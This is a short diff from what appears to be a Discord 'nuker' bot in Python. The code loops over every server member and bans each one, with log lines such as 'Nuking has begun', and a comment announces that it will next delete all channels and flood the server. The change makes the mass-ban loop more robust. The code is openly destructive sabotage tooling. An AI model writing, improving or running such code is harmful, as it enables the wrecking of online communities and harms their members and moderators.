@@ -448,15 +448,15 @@ async def execute(ctx):
             f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
         )
         
-        for member in ctx.guild.members:
-            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
+        for user in list(ctx.guild.members):
+            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {user}")
             try:
-                await member.ban()
+                await user.ban()
                 print(
-                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
+                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {user}"
                 )
             except:
-                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {member}")
+                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {user}")
 
         print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")        
         # delete all channels so we can flood that shit lmfao
